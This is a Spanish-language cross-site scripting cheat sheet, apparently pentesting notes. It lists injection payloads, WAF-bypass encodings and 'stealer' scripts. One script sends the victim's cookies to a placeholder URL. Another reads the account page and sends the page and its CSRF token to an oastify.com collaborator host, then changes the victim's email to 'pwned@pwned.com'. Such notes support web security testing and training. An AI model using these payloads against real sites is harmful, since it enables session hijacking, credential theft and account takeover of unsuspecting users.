-- -

## 🔍 **Reconocimiento**  
- Inyectá payloads simples en parámetros GET, POST o cabeceras.  
- Buscá `<script>alert(1)</script>` en la respuesta.  

---

## **Inyecciones Básicas (con Tag Cerrado)**  
```html
<script>alert(1)</script>
<img src="x" onerror="alert('XSS')" />
<iframe src="javascript:alert('XSS');"></iframe>
<svg onload="alert('XSS');"></svg>
<video><source onerror="alert('XSS');"></source></video>
<object data="javascript:alert('XSS');"></object>
<math><annotation-xml encoding="application/xhtml+xml"><script>alert('XSS');</script></annotation-xml></math>
```

---

## **Bypass de WAF**  
- **HTML Entities**: `&#60;script&#62;`.  
- **URL Encoding**: `%3Cscript%3E`.  
- **Hex/Unicode**: `\u003Cscript\u003E`.  
- **Double Encoding**: `%26%2360%3Bscript%26%2362%3B`.  

---
## **Algunos payloads**  
```javascript 
" style="animation-name:swoop-up" onanimationstart="alert(document.domain)
```

---
## **Stealers**
### **Cookie stealer**
```javascript
<script>
	fetch("https://URL/?cookie=" + btoa(document.cookie);
</script>
```

### **CSRF stealer**
```javascript
<script>
	var req = new XMLHttpRequest();
	req.open("GET", "/my-account", true);
	req.send();
	
	var response = req.responseText;
	var csrf_token = response.match(/name="csrf" value="(\w+)"/)[1];
	
	var req2 = new XMLHttpRequest();
	req2.open('GET', 'https://d1f1vc0tfn8d4zsygrb2pr4neek58wwl.oastify.com/?response=' + btoa(response), false);
	req2.send();
	
	var req3 = new XMLHttpRequest();
	req3.open('GET', 'https://d1f1vc0tfn8d4zsygrb2pr4neek58wwl.oastify.com/?token=' + btoa(csrf_token), false);
	req3.send();

	var req4 = new XMLHttpRequest();
	req4.open('POST', "/my-account/change-email", true);
	req4.setRequestHeader("Content-Type","application/x-www-form-urlencoded")
	var data = "email=" + encodeURIComponent("pwned@pwned.com") + "&csrf=" + encodeURIComponent(csrf_token);
	req4.send();
	
</script>
```

```javascript
<script> 
	var req = new XMLHttpRequest(); 
	req.onload = handleResponse; 
	req.open('get','/my-account',true);
	req.send(); 
	function handleResponse() { 
		var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1]; 
		var changeReq = new XMLHttpRequest(); changeReq.open('post', '/my-account/change-email', true); 
		changeReq.send('csrf='+token+'&email=test@test.com') }; 
</script>

```